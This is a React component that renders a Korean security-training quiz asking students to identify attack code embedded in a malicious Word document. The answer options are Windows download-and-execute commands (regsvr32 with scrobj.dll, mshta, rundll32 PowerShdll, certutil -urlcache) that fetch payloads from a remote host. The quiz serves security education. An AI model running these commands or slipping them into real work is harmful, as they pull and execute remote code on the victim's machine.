import React, {Component} from 'react';
import {withStyles} from "@material-ui/core/styles";
import clsx from "clsx";
import {Box, Button, FormControl, FormControlLabel, Input, Radio, RadioGroup, Typography} from "@material-ui/core";
import RadioButtonCheckedIcon from "@material-ui/icons/RadioButtonChecked";
import RadioButtonUncheckedIcon from "@material-ui/icons/RadioButtonUnchecked";
import {ReactComponent as PasswordNumberCheckedIcon} from "../../common/images/PasswordNumberCheckedIcon.svg";
import {ReactComponent as CheckCircle} from "../../common/images/CheckCircle.svg";
import {ReactComponent as PasswordNumberCheckedErrorIcon} from "../../common/images/PasswordNumberCheckedErrorIcon.svg";
import CalendarButtonComponent from "../contentLecture/CalendarButtonComponent";

const styles = theme => ({
    root:{
        width:'100%'
    },
    contentsBox:{
        width: 690,
        border:'1px solid #1664f5',
        borderTop: '4px solid #1664f5',
        borderRadius:8,
        boxSizing:'border-box',
        padding: '25px 35px 5px',
        background:'#fff',
        marginBottom: 20,
        margin:'0 auto'
    },
    contentsBox2:{
        width: '100%',
        '@media all and (min-width: 1500px)': {
            width: 690,
        },
    },
    caption: {
        width: 45,
        height: 20,
        borderRadius: 2,
        boxSizing: 'border-box',
        marginRight: 7,
        color: '#fff',
        '& svg': {
            marginRight: 3,
        },
    },
    captionBlue: {
        backgroundColor: '#4282fa',
    },
    marginBottom:{
        marginBottom:20
    },
    numberText:{
        fontSize:'0.938rem',
        color: '#4282fa',
        fontWeight: 600
    },
    textStyle:{
        width: 'calc(100% - 140px)',
        fontSize: '1.125rem'
    },
    textStyle2:{
        '@media all and (max-width: 1500px)': {
            fontSize:'0.875rem'
        },
    },
    bold:{
        fontWeight: 600
    },
    radioIcon: {
        fontSize: 18,
        color: '#1664f5'
    },
    inputBoxQuiz:{
        width:'80%',
        paddingLeft: 13,
        borderBottom:'1px solid #c4c9de',
        marginLeft: 20,
        "&::placeholder":{
            color:'#a3a8af'
        },
        '& .MuiInput-underline:after, .MuiInput-underline:before, .MuiInput-underline:hover:not(.Mui-disabled):before ':{
            borderBottom:0
        },
        '& .MuiInputBase-root':{
            width: '100%'
        }
    },
    bottomText:{
        fontSize: '0.813rem',
        color:'#1664f5',
        marginRight: 10
    },
    answerText:{
        fontSize: '0.938rem',
        color:'#f00'
    },
    studentBtn:{
        width: 112,
        height: 35,
        borderRadius: 4,
        background: '#568cf0',
        color: '#fff',
        '&:hover':{
            background: '#568cf0',
        }
    },
    buttonStyle:{
        position: 'absolute',
        width: 100,
        height: 35,
        boxSizing:'border-box',
        border:'1px solid #bfbfbf',
        borderRadius: 4,
        bottom:-45,
        right: 0,
        '&:hover':{
            background:'transparent'
        }
    },
    inputBox:{
        width: 35,
        borderBottom:0,
        '& .MuiInputBase-root':{
            fontSize:'0.938rem',
            color: '#4282fa',
            fontWeight: 600,
        },
        '& .MuiInput-underline:after, .MuiInput-underline:before, .MuiInput-underline:hover:not(.Mui-disabled):before ':{
            borderBottom:0
        }
    },
    leftBox:{
        paddingTop: 20,
    },
    checkBox:{
        display:'flex',
        justifyContent:'space-between',
        alignItems:'center',
        width:'100%',
        background:'rgba(22, 100, 245, 0.15)',
        margin:'5px 0',
        boxSizing:'border-box',
        paddingRight: 10,
        paddingLeft: 5,
        '& .check-circle':{
            fill:'#1664f5'
        },
        '& .checked-icon':{
            stroke:'#1664f5'
        }
    },
    checkBoxWrongAnswer:{
        display:'flex',
        justifyContent:'space-between',
        alignItems:'center',
        width:'100%',
        background:'rgba(255, 0, 0, 0.15)',
        margin:'5px 0',
        boxSizing:'border-box',
        paddingRight: 10,
        paddingLeft: 5,
        '& .check-circle':{
            fill:'#1664f5'
        },
        '& .checked-icon':{
            stroke:'#1664f5'
        }
    },
    checkBox2:{
        margin:'5px 0',
        paddingLeft: 5,
        '& .check-circle':{
            fill:'#1664f5'
        },
    },
    formControl:{
        width: '100%',
        '& .MuiButtonBase-root':{
            padding: 0
        },
        '& .MuiFormControlLabel-root':{
            margin: 0
        },
        '& .MuiIconButton-root':{
            marginRight: 10,
            '& svg':{
                width: 18,
                height: 18
            }
        }
    }
});

class ClassWindowMultipleSingle extends Component {
    constructor(props) {
        super(props);
        this.state = {
            scoreButton: false,
            selectedValue: 'a'
        };
    }

    handleChange = event => {
        this.setState({ selectedValue: event.target.value });
    };

    handleClickButton = () => {
        this.setState({ scoreButton: !this.state.scoreButton });
    };

    render() {
        const { classes, typeButton2, classTab, students } = this.props;

        return (
            <div className={classes.root}>
                <Box  className={typeButton2 ? clsx(classes.contentsBox,classes.contentsBox2) : classes.contentsBox}>
                    <Box display='flex' flexDirection='column' justifyContent='center' alignItems='flex-end' style={{position:'relative'}} mb={1}>
                        <Box display='flex' alignItems='center' >
                            <Box display='flex' justifyContent='center' alignItems='center'
                                 className={clsx(classes.caption, classes.captionBlue)}>
                                <Typography>평가</Typography>
                            </Box>
                            {this.state.scoreButton ?
                                <Box className={classes.inputBox}>
                                    <Input
                                        placeholder=""
                                        inputProps={{
                                            'aria-label': 'Description',
                                        }}
                                    />
                                </Box>
                                :
                                <Typography className={classes.numberText}>-</Typography>
                            }
                            <Typography className={classes.numberText}>/100</Typography>
                        </Box>
                        {classTab === 2 &&
                        <Button className={classes.buttonStyle} onClick={this.handleClickButton}
                                disableRipple>채점하기</Button>
                        }
                    </Box>
                    <Box className={classes.marginBottom}>
                        <Typography style={{fontWeight:600}}>[퀴즈]</Typography>
                        <Typography className={typeButton2 ? clsx(classes.textStyle, classes.textStyle2, classes.bold) : clsx(classes.textStyle, classes.bold)}>
                            “malicious-8bc.docx” 문서를 삽입된 공격 코드를 식별하세요.
                        </Typography>
                    </Box>

                    <FormControl component="fieldset" className={classes.formControl}>
                        <RadioGroup
                            aria-label="Radio"
                            name="Radio"
                            className={classes.group}
                            value={this.state.selectedValue}
                            onChange={this.handleChange}
                        >
                            {/* 선택했을경우 */}
                            <Box className={students ? classes.checkBox : classes.checkBox2}>
                                <FormControlLabel
                                    value="a"
                                    control={
                                        <Radio
                                            checkedIcon={<CheckCircle className={classes.radioIcon}/>}
                                            icon={<RadioButtonUncheckedIcon className={classes.radioIcon} style={{color: '#979797'}}/>}
                                            disableRipple
                                        />
                                    }
                                    label="가. cmd.exe /c regsvr32.exe /s /n /u /i:http://www.waver.com/bmda4kl4 scrobj.dll"
                                />

                                {students &&
                                    <PasswordNumberCheckedIcon/>
                                }
                            </Box>
                            <Box className={classes.checkBox2}>
                                <FormControlLabel
                                    value="b"
                                    control={
                                        <Radio
                                            checkedIcon={<CheckCircle className={classes.radioIcon}/>}
                                            icon={<RadioButtonUncheckedIcon className={classes.radioIcon} style={{color: '#979797'}}/>}
                                            disableRipple
                                        />
                                    }
                                    label="나. mshta.exe javascript:a=(GetObject(&#34;script:http://www.waver.com/m.sct&#34;)).Exec();close();"
                                />
                            </Box>
                            <Box className={classes.checkBox2}>
                                <FormControlLabel
                                    value="c"
                                    control={
                                        <Radio
                                            checkedIcon={<CheckCircle className={classes.radioIcon}/>}
                                            icon={<RadioButtonUncheckedIcon className={classes.radioIcon} style={{color: '#979797'}}/>}
                                            disableRipple
                                        />
                                    }
                                    label="다. rundll32.exe PowerShdll.dll,main"
                                />
                            </Box>

                            {/* 오답일경우 */}
                            <Box className={students ? classes.checkBoxWrongAnswer : classes.checkBox2}>
                                <FormControlLabel
                                    value="d"
                                    control={
                                        <Radio
                                            checkedIcon={<CheckCircle className={classes.radioIcon}/>}
                                            icon={<RadioButtonUncheckedIcon className={classes.radioIcon} style={{color: '#979797'}}/>}
                                            disableRipple
                                        />
                                    }
                                    label="라. certutil.exe -urlcache -f http://http://www.waver.com/bmda4kl4/40564.exe bad.exe"
                                />
                                {students &&
                                    <PasswordNumberCheckedErrorIcon/>
                                }
                            </Box>
                            {/*<Box className={classes.checkBox2}>*/}
                            {/*    <FormControlLabel*/}
                            {/*        value="e"*/}
                            {/*        control={*/}
                            {/*            <Radio*/}
                            {/*                checkedIcon={<CheckCircle className={classes.radioIcon}/>}*/}
                            {/*                icon={<RadioButtonUncheckedIcon className={classes.radioIcon} style={{color: '#979797'}}/>}*/}
                            {/*                disableRipple*/}
                            {/*            />*/}
                            {/*        }*/}
                            {/*        label="2.기타"*/}
                            {/*    />*/}
                            {/*</Box>*/}
                        </RadioGroup>
                    </FormControl>
                    {/*<Box className={typeButton2 ? clsx(classes.inputBoxQuiz, classes.inputBoxIn2) : classes.inputBoxQuiz}>*/}
                    {/*    <Input*/}
                    {/*        placeholder=""*/}
                    {/*        inputProps={{*/}
                    {/*            'aria-label': 'Description',*/}
                    {/*        }}*/}
                    {/*    />*/}
                    {/*</Box>*/}


                    <Box display='flex' justifyContent='space-between' alignItems='center' mt={3} mb={2}>
                        <Box>
                            {classTab === 2 ?
                                students ?
                                    <Button className={classes.studentBtn} disableRipple>다른 응답 제출</Button>
                                    :
                                    <Typography className={classes.answerText}>정답: 3.줌</Typography>
                                :
                                null
                            }
                        </Box>
                        <Box display='flex' alignItems='center'>
                            <Typography className={classes.bottomText}>마감됨</Typography>
                            <CalendarButtonComponent/>
                        </Box>

                    </Box>
                </Box>
            </div>
        );
    }
}

export default withStyles(styles)(ClassWindowMultipleSingle);